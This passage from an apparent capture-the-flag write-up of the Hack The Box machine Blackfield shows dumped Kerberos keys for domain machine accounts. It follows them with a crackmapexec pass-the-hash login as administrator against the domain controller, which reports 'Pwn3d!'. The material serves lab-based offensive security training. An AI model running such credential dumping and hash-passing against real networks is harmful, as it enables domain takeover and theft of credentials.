PC08$:aes128-cts-hmac-sha1-96:ee1e13e5f1823ebf0b41edbab047e8ba
PC08$:des-cbc-md5:c8f18f2a401fb598
PC09$:aes256-cts-hmac-sha1-96:62531bece543149b915656019a7d0299a812ce2b256e7f07fced3d84edfcd29d
PC09$:aes128-cts-hmac-sha1-96:7cd041db74336675dea6d9704f8a432e
PC09$:des-cbc-md5:7fcb869d4373ef97
PC10$:aes256-cts-hmac-sha1-96:d619da2d51bc23fb88e917c5d45407ae406478262f963519b08b883a993ca873
PC10$:aes128-cts-hmac-sha1-96:56c45edbe77b96b7903bc1f3bf5c71ac
PC10$:des-cbc-md5:ce7a31d0d368bff7
PC11$:aes256-cts-hmac-sha1-96:7ff03e37e07a863ac2f4bae29108e4c231dd1d91b01890f377d3263abe69cc61
PC11$:aes128-cts-hmac-sha1-96:cf4217c00d17225191d52d7fea230e8d
PC11$:des-cbc-md5:461fb0794ab64a3d
PC12$:aes256-cts-hmac-sha1-96:5c78d2c05bd1d0ba0fc83acbfa72db66f8f93edc62fd66e63ab464b0b375b0a1
PC12$:aes128-cts-hmac-sha1-96:b56b48bb51646c992c300ed8f9b4042f
PC12$:des-cbc-md5:9e160b107c2c920b
PC13$:aes256-cts-hmac-sha1-96:98ab60128d548dbb9b3383b477a55bd466ab4127b01bb0d2629505c6d0e93865
PC13$:aes128-cts-hmac-sha1-96:0d4e1a5f00bf9933cc1045fd5c61b17a
PC13$:des-cbc-md5:bfc73b8602d5ab2c
SRV-WEB$:aes256-cts-hmac-sha1-96:090ad36e547c20ff359787a27d452243ab3e9ef4b54595add458fbd265e6c103
SRV-WEB$:aes128-cts-hmac-sha1-96:063e5e2795292318208f411f8ce0797e
SRV-WEB$:des-cbc-md5:b580c4c2bc0b19d6
SRV-FILE$:aes256-cts-hmac-sha1-96:eae9659f47e401ba621fe838cc590494d13eb75f3140c366301222356a200f65
SRV-FILE$:aes128-cts-hmac-sha1-96:44da7f10383facd38df5713bc4259e69
SRV-FILE$:des-cbc-md5:f47cc238c1ce9791
SRV-EXCHANGE$:aes256-cts-hmac-sha1-96:04268f211f13d2f617f68ce89e795e360a01efb0bd1645e10853f4fdc3096a65
SRV-EXCHANGE$:aes128-cts-hmac-sha1-96:eb62e53de31dc30bcefe16e89289efff
SRV-EXCHANGE$:des-cbc-md5:f162aeb3da497aab
SRV-INTRANET$:aes256-cts-hmac-sha1-96:bc6ddf66d2027c2b9f4b921726d53032cad3e14efd5291c114f1ae76547be9a6
SRV-INTRANET$:aes128-cts-hmac-sha1-96:54416d5a7209a9bb741740834dddc7ad
SRV-INTRANET$:des-cbc-md5:4579ce9240895dae
[*] Cleaning up... 
```

Pwned :

```terminal
❯ cme smb 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%2011.png)
